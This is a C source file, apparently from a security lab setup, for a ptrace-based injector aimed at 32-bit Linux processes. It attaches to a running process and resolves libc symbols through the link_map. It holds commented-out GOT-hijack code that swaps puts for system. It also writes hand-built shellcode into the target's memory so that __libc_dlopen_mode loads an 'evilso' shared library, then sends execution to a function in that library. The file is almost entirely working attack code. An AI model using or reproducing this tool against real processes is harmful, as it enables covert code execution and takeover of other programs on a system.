#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/user.h>
#include "elf.h"
#include <link.h>

void ptrace_attach(int pid);
void ptrace_cont(int pid);
void ptrace_detach(int pid);
void *read_data(int pid ,unsigned long addr ,void *vptr ,int len);
void write_data(int pid ,unsigned long addr ,void *vptr,int len);
unsigned long read_got(int pid ,unsigned long got);
void write_got(int pid,unsigned long got,unsigned long *hijack);
void resolv_tables(int pid , struct link_map *map);
struct link_map *find_linkmap(int pid,struct link_map *l,char *so_name,int len);
unsigned long find_sym_in_tables(int pid, struct link_map *map , char *sym_name);
void execve_func(int pid,unsigned long evil_func);

unsigned long   symtab;
unsigned long   strtab;
int            nchains;

void inject_so(int pid, char *evilso, long dlopen_addr, long inject_position);
void setaddr(unsigned char *buf, ElfW(Addr) addr);

struct link_map *locate_linkmap(int pid);

int main(int argc,char **argv)
{
	pid_t pid = 0;
	struct link_map *l  = malloc(sizeof(struct link_map));
	struct link_map *l2 = malloc(sizeof(struct link_map));
	struct link_map *ll = malloc(sizeof(struct link_map));
	char *n = (char *)malloc(50);
	unsigned long addr;
	unsigned long puts_got = (unsigned long)0x804a010;

	pid = atoi(argv[1]);
	printf("[+] PID : %d\n",pid);

	ptrace_attach(pid);
	l = locate_linkmap(pid);
	l2 = find_linkmap(pid,l,"/home/vagrant/STCS/glibc-2.23/32/lib/libc.so.6",strlen("/home/vagrant/STCS/glibc-2.23/32/lib/libc.so.6"));
	
	resolv_tables(pid,l2);
	nchains = 2414;

	//addr = find_sym_in_tables(pid,l2,"puts");
	//printf("[*] puts addr : 0x%x \n",addr);
	
	//addr = find_sym_in_tables(pid,l2,"__libc_system");
	//printf("[*] system addr : 0x%x \n",addr);

	// GOT Hijack 
	//write_got(pid,puts_got,&addr);
	//printf("[*] puts addr : 0x%x \n",addr);

	addr = find_sym_in_tables(pid,l2,"__libc_dlopen_mode");
	printf("[*] __libc_dlopen_mode : 0x%x \n",addr);
	
	inject_so(pid,"./sample_so.so",addr,0x80483b0);

	ll = find_linkmap(pid,l,"./sample_so.so",strlen("./sample_so.so"));
	
	resolv_tables(pid,ll);
	addr = find_sym_in_tables(pid,ll,"sample_func");
	printf("[*] sample_func : 0x%x \n",addr);

	execve_func(pid,addr);

	ptrace_detach(pid);

}


/* attach to pid */
void ptrace_attach(int pid)
{
	if((ptrace(PTRACE_ATTACH , pid , NULL , NULL)) < 0) {
		perror("ptrace_attach");
		exit(-1);
	}
	waitpid(pid , NULL , WUNTRACED);
}

/* continue execution */
void ptrace_cont(int pid)
{
	int s;
	if((ptrace(PTRACE_CONT , pid , NULL , NULL)) < 0) {
		perror("ptrace_cont");
		exit(-1);
	}

	while (!WIFSTOPPED(s)) waitpid(pid , &s , WNOHANG);
}


/* detach process */
void ptrace_detach(int pid)
{
	if(ptrace(PTRACE_DETACH, pid , NULL , NULL) < 0) {
		perror("ptrace_detach");
		exit(-1);
	}
}

/* read data from location addr */
void *read_data(int pid ,unsigned long addr ,void *vptr ,int len)
{
	int i , count;
	long word;
	unsigned long *ptr = (unsigned long *) vptr;

	count = i = 0;
	
	while (count < len) {
		word = ptrace(PTRACE_PEEKTEXT ,pid ,addr+count,NULL);
		count += 4;
		ptr[i++] = word;
	}
}

unsigned long read_got(int pid ,unsigned long got)
{
	unsigned long *addr = (unsigned long *)malloc(4);

	read_data(pid,got,addr,4);

	return *addr; 
}


/* write data to location addr */	
void write_data(int pid ,unsigned long addr ,void *vptr,int len)
{
    int i , count;
    long word;

	i = count = 0;

	while (count < len) {
		memcpy(&word , vptr+count , sizeof(word));
		word = ptrace(PTRACE_POKETEXT, pid , addr+count , word);
		count +=4;
	}
}

void write_got(int pid,unsigned long got,unsigned long *hijack)
{
	write_data(pid,got,hijack,4);
}


struct link_map *locate_linkmap(int pid)
{
	Elf32_Ehdr      *ehdr   = malloc(sizeof(Elf32_Ehdr));
	Elf32_Phdr      *phdr   = malloc(sizeof(Elf32_Phdr));
	Elf32_Dyn       *dyn    = malloc(sizeof(Elf32_Dyn));
	Elf32_Word      got;
	struct link_map *l      = malloc(sizeof(struct link_map));
	unsigned long   phdr_addr , dyn_addr , map_addr;

	/* first we check from elf header, mapped at 0x08048000, the offset
	 * to the program header table from where we try to locate
	 * PT_DYNAMIC section.
	 */

	read_data(pid , 0x08048000 , ehdr , sizeof(Elf32_Ehdr));

	phdr_addr = 0x08048000 + ehdr->e_phoff;
	printf("[+] Program Header : 0x%x\n", phdr_addr);

	read_data(pid , phdr_addr, phdr , sizeof(Elf32_Phdr));

	while ( phdr->p_type != PT_DYNAMIC ) {
		read_data(pid, phdr_addr += sizeof(Elf32_Phdr), phdr, sizeof(Elf32_Phdr));
	}

	/* now go through dynamic section until we find address of the GOT
	 */

	read_data(pid, phdr->p_vaddr, dyn, sizeof(Elf32_Dyn));
	dyn_addr = phdr->p_vaddr;

	while ( dyn->d_tag != DT_PLTGOT ) {
		read_data(pid, dyn_addr += sizeof(Elf32_Dyn), dyn, sizeof(Elf32_Dyn));
	}

	got = (Elf32_Word) dyn->d_un.d_ptr;
	got += 4; 		/* second GOT entry, remember? */
	printf("[+] GOT+4 : 0x%x \n",got);
	
	/* now just read first link_map item and return it */
	read_data(pid, (unsigned long) got, &map_addr , 4);
	printf("[+] link_map : 0x%x \n",map_addr);
	read_data(pid , map_addr, l , sizeof(struct link_map));

	free(phdr);
	free(ehdr);
	free(dyn);

	return l;
}

struct link_map *find_linkmap(int pid,struct link_map *l,char *so_name,int len)
{
	struct link_map *ll = malloc(sizeof(struct link_map));
	unsigned long addr = 0;
	char *find_name = (char *)malloc(50);

	ll = l;

	while(strncmp(find_name,so_name,len))
	{
		addr = (unsigned long)ll->l_next;
		read_data(pid,addr,ll,sizeof(struct link_map));
		addr = (unsigned long)ll->l_name;
		read_data(pid,addr,find_name,50);
		printf("[+] library : %s \n",find_name);
	}

	return ll;

}
/* search locations of DT_SYMTAB and DT_STRTAB and save them into global
 * variables, also save the nchains from hash table.
 */
void resolv_tables(int pid , struct link_map *map)
{
    Elf32_Dyn *dyn = (Elf32_Dyn *)malloc(sizeof(Elf32_Dyn));
    unsigned long addr;
	int i;

    addr = (unsigned long) map->l_ld;
	printf("[+] library addr : 0x%x \n",addr);

    read_data(pid , addr, dyn, sizeof(Elf32_Dyn));
	
    while( dyn->d_tag ) {
        switch ( dyn->d_tag ) {
            case DT_HASH:
				read_data(pid,dyn->d_un.d_ptr, &nchains , sizeof(nchains));
                break;
            case DT_STRTAB:
                strtab = dyn->d_un.d_ptr;
                break;
            case DT_SYMTAB:
                symtab = dyn->d_un.d_ptr;
                break;
            default:
                break;
        }
        addr += sizeof(Elf32_Dyn);
        read_data(pid, addr , dyn , sizeof(Elf32_Dyn));
    }

	printf("[+] SYMTAB : 0x%x\n", symtab);
	printf("[+] STRTAB : 0x%x\n", strtab);

    free(dyn);
}


/* find symbol in DT_SYMTAB */
unsigned long find_sym_in_tables(int pid, struct link_map *map , char *sym_name)
{
    Elf32_Sym *sym = (Elf32_Sym *)malloc(sizeof(Elf32_Sym));
    char *str      = malloc(strlen(sym_name));
    int i = 0;

    while (i < nchains) {
        read_data(pid, symtab+(i*sizeof(Elf32_Sym)), sym,sizeof(Elf32_Sym));
        i++;

        if (ELF32_ST_TYPE(sym->st_info) != STT_FUNC) continue;

        /* read symbol name from the string table */
		read_data(pid,strtab + sym->st_name,str,strlen(sym_name));
		//printf("[%d] %s \n",i,str);

        if(strncmp(str , sym_name , strlen(sym_name)) == 0){
            /* libc base : map->l_addr */
			return(map->l_addr+sym->st_value);
		}
    }
	
	free(sym);
	free(str);

    /* no symbol found, return 0 */
    return 0;
}

unsigned char soloader[] =
	"\x90"                 // nop
	"\xeb\x13"             // jmp  aaaa;
	"\x58"                 // pop  eax          <- bbbb
	"\xba\x01\x00\x00\x00" // mov  edx,1
	"\x52"	 			   // push edx
	"\x50"                 // push ebx
	"\xbb\x03\x00\x00\x00" // mov  ebx,<libc_dlopen_mode_addr>
	"\xff\xd3"             // call ebx
	"\x83\xc4\x08"         // add  esp,0x8
	"\xcc"                 // int  3
	"\xe8\xe8\xff\xff\xff";// call bbbb        <- aaaa


void setaddr(unsigned char *buf, ElfW(Addr) addr)
{
    *(buf) = addr;
    *(buf + 1) = addr >> 8;
    *(buf + 2) = addr >> 16;
    *(buf + 3) = addr >> 24;
}

/*
 *	pid : process id
 *	evilso : .so path which you want to inject
 *	dlopen_addr : __libc_dlopen_mode addr
 *	inject_position : a free space
 */
void inject_so(int pid, char *evilso, long dlopen_addr, long inject_position) 
{
	struct user_regs_struct regz, regzbak;
	unsigned long len;
	unsigned char *backup = NULL;
	unsigned char *loader = NULL;

	setaddr(soloader + 12, dlopen_addr);

	printf("[+] entry point: 0x%x\n", inject_position);

	len = sizeof(soloader) + strlen(evilso);    // total injection code len
	
	loader = malloc(len);
	
	memcpy(loader, soloader, sizeof(soloader)); 
	memcpy(loader+sizeof(soloader) - 1 , evilso, strlen(evilso));


	backup = malloc(len + sizeof(long));
	read_data(pid, inject_position, backup, len); // backup the original code

	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
	if(ptrace(PTRACE_GETREGS , pid , NULL , &regzbak) < 0) exit(-1);
	printf("[+] stopped %d at eip:%p, esp:%p\n", pid, regz.eip, regz.esp);

	regz.eip = inject_position + 2;

	/*code inject */
	write_data(pid, inject_position, loader, len);

	/*set eip as entry_point */
	ptrace(PTRACE_SETREGS , pid , NULL , &regz);
	ptrace_cont(pid);

	if(ptrace(PTRACE_GETREGS , pid , NULL , &regz) < 0) exit(-1);
	printf("[+] inject code done %d at eip:%p\n", pid, regz.eip);

	/*restore backup data */
	ptrace(PTRACE_SETREGS , pid , NULL , &regzbak);
}

void execve_func(int pid,unsigned long evil_func)
{
	struct user_regs_struct reg,oldreg;
	if(ptrace(PTRACE_GETREGS , pid , NULL , &reg) < 0) exit(-1);
	if(ptrace(PTRACE_GETREGS , pid , NULL , &oldreg) < 0) exit(-1);
	printf("[+] stopped %d at eip:%p, esp:%p\n", pid, reg.eip, reg.esp);
	
	reg.eip = evil_func;
	ptrace(PTRACE_SETREGS , pid , NULL , &reg);
	ptrace_cont(pid);

	if(ptrace(PTRACE_GETREGS , pid , NULL , &reg) < 0) exit(-1);
	printf("[+] inject code done %d at eip:%p\n", pid, reg.eip);

	ptrace(PTRACE_SETREGS , pid , NULL , &oldreg);
	
}



